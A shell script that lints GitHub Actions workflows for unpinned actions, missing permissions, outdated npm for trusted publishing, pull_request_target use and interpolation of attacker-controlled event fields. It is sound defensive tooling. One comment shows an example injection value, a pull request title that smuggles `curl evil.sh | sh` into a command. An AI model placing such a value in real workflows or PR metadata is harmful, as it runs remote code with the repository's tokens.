#!/bin/sh
# Enforce the rules the workflows are supposed to follow. Each one is a rule a
# hurried edit breaks silently and that no other test would notice.
#
# Usage: scripts/lint-workflows.sh [dir]
set -eu

DIR=${1:-.github/workflows}
failures=0

pass() { printf '  ok    %s\n' "$1"; }
fail() { printf '  FAIL  %s\n' "$1"; failures=$((failures + 1)); }
show() { printf '%s\n' "$1" | sed 's/^/        /'; }

printf '\nLinting %s\n\n' "$DIR"

echo 'Pinning'
# A tag is a moving pointer. Whoever controls an action's repository can move
# `v4` to any commit they like, and every workflow trusting that tag then runs
# it with whatever token the workflow holds. A commit SHA cannot be moved.
unpinned=$(grep -Hn 'uses:' "$DIR"/*.yml \
  | grep -v 'uses: \./' \
  | grep -Ev 'uses: [^@]+@[0-9a-f]{40}' || true)
if [ -z "$unpinned" ]; then
  pass 'every action is pinned to a commit SHA'
else
  fail 'every action is pinned to a commit SHA'; show "$unpinned"
fi

# The SHA makes it safe; the comment makes it maintainable. Dependabot reads the
# comment to know which version a pin represents, and a human reading a bare
# forty-character hex string learns nothing at all from it.
uncommented=$(grep -Hn 'uses: [^@]*@[0-9a-f]\{40\}' "$DIR"/*.yml | grep -v '# v' || true)
if [ -z "$uncommented" ]; then
  pass 'every pin names its version in a comment'
else
  fail 'every pin names its version in a comment'; show "$uncommented"
fi

# A well-formed SHA that points at nothing fails the workflow at run time, and a
# typo in forty hex characters is not something review catches. Needs network and
# an authenticated gh, so it steps aside rather than failing when either is
# missing -- the format checks above still ran.
if command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then
  bad=''
  for pin in $(grep -ho 'uses: [^@]*@[0-9a-f]\{40\}' "$DIR"/*.yml | sed 's/uses: //' | sort -u); do
    repo=${pin%@*}
    sha=${pin##*@}
    owner=$(printf '%s' "$repo" | cut -d/ -f1,2)
    gh api "repos/$owner/commits/$sha" --jq '.sha' >/dev/null 2>&1 || bad="$bad$pin\n"
  done
  if [ -z "$bad" ]; then
    pass 'every pinned SHA exists upstream'
  else
    fail 'every pinned SHA exists upstream'; show "$(printf "$bad")"
  fi

  # The requirement reaches inside: a composite action that calls another by tag
  # is refused just as a workflow would be, and the failure lands at run time
  # with a message about an action this repository never mentions. Checking the
  # first level catches the realistic case -- it is how a Pages deploy here was
  # rejected for `actions/upload-artifact@v4`, which appears in no file.
  nested=''
  for pin in $(grep -ho 'uses: [^@]*@[0-9a-f]\{40\}' "$DIR"/*.yml | sed 's/uses: //' | sort -u); do
    repo=${pin%@*}
    sha=${pin##*@}
    owner=$(printf '%s' "$repo" | cut -d/ -f1,2)
    for f in action.yml action.yaml; do
      body=$(gh api "repos/$owner/contents/$f?ref=$sha" --jq '.content' 2>/dev/null | base64 -d 2>/dev/null) || continue
      [ -z "$body" ] && continue
      loose=$(printf '%s' "$body" | grep -o 'uses: [^ ]*' | grep -v 'uses: \./' | grep -Ev '@[0-9a-f]{40}' || true)
      [ -n "$loose" ] && nested="$nested$repo -> $(printf '%s' "$loose" | tr '\n' ' ')\n"
      break
    done
  done
  if [ -z "$nested" ]; then
    pass 'no pinned action calls another one by tag'
  else
    fail 'no pinned action calls another one by tag'; show "$(printf "$nested")"
  fi
else
  printf '  skip  upstream SHA and nested-action checks (no authenticated gh)\n'
fi

echo 'Publishing'
# A workflow that publishes to npm has to run on a Node whose bundled npm is new
# enough for trusted publishing. Getting this wrong is not a loud failure: an
# npm too old to attempt OIDC sends an unauthenticated request, and npm answers
# a PUT it cannot authenticate with `404 Not Found` rather than 401. The release
# then fails claiming the package does not exist, long after a tag has been
# pushed. Catching it here means catching it in review instead.
NPM_FLOOR=11.5.1
publishers=$(grep -l 'npm publish' "$DIR"/*.yml 2>/dev/null || true)
if [ -z "$publishers" ]; then
  printf '  skip  npm publishers run a new enough npm (none publish)\n'
elif ! command -v python3 >/dev/null 2>&1 || ! curl -sf --max-time 15 https://nodejs.org/dist/index.json -o /dev/null; then
  printf '  skip  npm publishers run a new enough npm (no network)\n'
else
  index=$(curl -sf --max-time 20 https://nodejs.org/dist/index.json)
  trouble=''
  for f in $publishers; do
    for major in $(grep -o 'node-version: *[0-9]*' "$f" | grep -o '[0-9]*$' | sort -u); do
      verdict=$(printf '%s' "$index" | python3 -c "
import json, sys
major, floor = '$major', '$NPM_FLOOR'
releases = [r for r in json.load(sys.stdin) if r['version'].startswith('v' + major + '.') and r.get('npm')]
if not releases:
    print('unknown'); raise SystemExit
npm = releases[0]['npm']
key = lambda v: tuple(int(p) for p in v.split('.')[:3])
print(f'{npm} ' + ('ok' if key(npm) >= key(floor) else 'old'))
")
      case $verdict in
        *ok) pass "$(basename "$f"): node $major bundles npm ${verdict%% *}" ;;
        *old) trouble="$trouble$(basename "$f"): node $major bundles npm ${verdict%% *}, below $NPM_FLOOR\n" ;;
        *) trouble="$trouble$(basename "$f"): could not determine the npm bundled with node $major\n" ;;
      esac
    done
  done
  if [ -n "$trouble" ]; then
    fail "npm publishers run npm >= $NPM_FLOOR"; show "$(printf "$trouble")"
  fi
fi

echo 'Permissions'
# Without an explicit block a workflow inherits the repository default, which
# may be write-all. Any step -- including one inside a dependency -- would then
# hold a token that can push to the default branch.
for f in "$DIR"/*.yml; do
  name=$(basename "$f")
  if grep -q '^permissions:' "$f"; then
    pass "$name declares top-level permissions"
  else
    fail "$name declares top-level permissions"
  fi
done

echo 'Untrusted input'
# GitHub interpolates these before the shell ever sees them, so a pull request
# titled `a"; curl evil.sh | sh; #` becomes part of the command. Passed through
# an environment variable instead, the shell treats it as data. The list is
# GitHub's own set of attacker-controlled event fields.
risky='github\.event\.(issue|pull_request|discussion)\.(title|body)'
risky="$risky|github\.event\.(comment|review)\.body"
risky="$risky|github\.event\.pull_request\.head\.(ref|label)"
risky="$risky|github\.event\.head_commit\.message|github\.head_ref"
inject=$(grep -HnE "\\\$\{\{[^}]*($risky)" "$DIR"/*.yml || true)
if [ -z "$inject" ]; then
  pass 'no attacker-controlled text is interpolated into a script'
else
  fail 'no attacker-controlled text is interpolated into a script'; show "$inject"
fi

# pull_request_target runs with the base repository's secrets while the pull
# request's own code sits in the tree. Checking that code out and running it
# hands any fork write access to this repository.
prt=$(grep -Hn 'pull_request_target' "$DIR"/*.yml || true)
if [ -z "$prt" ]; then
  pass 'no workflow uses pull_request_target'
else
  fail 'no workflow uses pull_request_target'; show "$prt"
fi

printf '\n'
if [ "$failures" -eq 0 ]; then
  echo 'All checks passed.'
else
  echo "$failures check(s) failed."
  exit 1
fi
